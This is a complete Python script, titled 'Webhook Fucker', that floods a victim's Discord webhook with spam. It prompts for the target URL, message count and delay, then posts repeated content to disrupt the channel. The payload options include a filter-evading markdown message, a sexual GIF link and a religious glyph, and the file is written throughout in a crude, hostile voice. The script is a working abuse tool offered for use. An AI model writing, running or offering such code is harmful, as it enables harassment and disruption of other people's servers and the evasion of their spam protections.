import os
import time
import math
import random
import requests
from discord_webhook import DiscordWebhook

##########

speed_coil = requests.get("https://pastebin.com/raw/1CunE69Q").text

##########

os.system("title Webhook Fucker - v1.0.0")
os.system("cls")
os.system("color 0c")

##########

print(speed_coil)
targetwebhook = input("\n\nWelcome to Webhook Fucker!\n Victim webhook URL: ")
webhookusername = input("Custom webhook username (leave blank for default): ")
messagedelay = int(input("Amount of seconds between webhook messages (0 for fastest speed): "))
totalmessages = int(input("Total amount of messages: "))
spamtype = int(input("Webhook spamming type:\n\n[1]: Arabic Allah Propaganda\n[2]: Spam bypass\n[3]: Belle Delphine\n[4]: Custom (from file: customspam.txt)\n\nSelect a number option: "))
os.system("cls")
print(speed_coil)
print("\n\nWorking...")
time.sleep(2)
os.system("cls")
print(speed_coil)

##########

spamarray = []
if spamtype==1:
    spamarray = ["﷽"]
if spamtype==2:
    spamarray = ["```i``` ```a```m``` ```t```o```t```a```l```l```y``` ```n```o```t``` ```t```r```y```i```n```g``` ```t```o``` ```f```l```o```o```d``` ```y```o```u```r``` ```s```e```r```v```e```r``` ```e```n```j```o```y``` ```t```h```i```s``` ```w```h```i```l```e``` ```t```r```y```i```n```g``` ```t```o``` ```b```l```o```c```k``` ```y```o```u```r``` ```w```e```b```h```o```o```k``` ```<```3```"]
if spamtype==3:
    spamarray = ["your channel has been destroyed now this girl while she is fucking up lol https://cdn.discordapp.com/attachments/795284143503441960/795284437527953428/HandsomeParchedCutworm-size_restricted.gif"]
if spamtype==4:
    customspam = open("customspam.txt","r")
    with customspam as x:
        line = x.read().splitlines()
        for b in line:
            spamarray.append(b)

##########

bar=""
percent="0%"
start=0
end=totalmessages
def main():
    os.system("cls")
    global bar
    global percent
    global start
    global end
    bar = ""
    start = start + 1
    percent = math.floor(start/end*100)
    for i in range(math.floor(percent/5)):
        bar = bar + "▓"
    for i in range(20-len(bar)):
        bar = bar + "░"
    print(speed_coil+"\n")
    print(f"\nMessages sent: {start}/{end}")
    print(f"Progress of webhook being fucked: \n[{bar}] {str(percent)}%")

    if webhookusername=="":
        DiscordWebhook(url=[str(targetwebhook)], content=random.choice(spamarray)).execute()
    else:
        DiscordWebhook(url=[str(targetwebhook)],username=webhookusername, content=random.choice(spamarray)).execute()

########## 

for i in range(totalmessages):
    time.sleep(messagedelay)
    main()

input("Webhook Fucker finished fucking the webhook, press any key to exit")
